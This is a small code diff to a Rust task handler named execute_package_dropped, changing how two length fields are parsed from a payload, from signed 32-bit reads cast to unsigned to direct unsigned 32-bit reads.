@@ -198,8 +198,8 @@ fn execute_package_dropped(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let dropped_length = parser.int32()? as u32;
-    let max_length = parser.int32()? as u32;
+    let dropped_length = parser.uint32()?;
+    let max_length = parser.uint32()?;
 
     tracing::warn!(
         request_id,
